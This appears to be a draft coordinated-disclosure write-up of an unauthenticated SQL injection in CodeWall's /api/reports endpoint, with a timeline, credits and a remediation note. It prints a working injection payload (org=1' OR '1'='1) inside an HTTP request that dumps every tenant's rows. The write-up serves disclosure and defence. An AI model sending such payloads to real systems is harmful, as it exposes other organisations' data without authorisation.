# How we hacked Unauthenticated SQL injection in CodeWall /api/reports

> DRAFT — sanitised writeup generated from a disclosure record. Operator review required before publication; embargo rules in `disclosure/AGENTS.md` still apply.

**Target:** `codewall` · **Class:** sql-injection · **Severity:** critical · **CVE:** CVE-2026-12345 · **Status:** published-cve

## Summary

The CodeWall `/api/reports` endpoint concatenates the `org` query
parameter into a SQL WHERE clause with no authentication. An unauthenticated
attacker reads arbitrary rows across every tenant.

## How we found it

Send `GET /api/reports?org=1' OR '1'='1`. The response returns rows for
every org, not just the requested one.

```http
GET /api/reports?org=1' OR '1'='1 HTTP/1.1
Authorization: <REDACTED-Authorization>
Cookie: <REDACTED-Cookie>
```

## Timeline

- 2026-06-10 — Reported to security@codewall.example.
- 2026-06-12 — Maintainer (<REDACTED-EMAIL>) acknowledged.
- 2026-06-17 — Fix shipped; CVE-2026-12345 assigned; advisory published.

## Remediation

Use parameterised queries and require an authenticated, org-scoped session.

## Credits

Found by 0sec's automated security-research tooling ([0sec.ai](https://0sec.ai)).
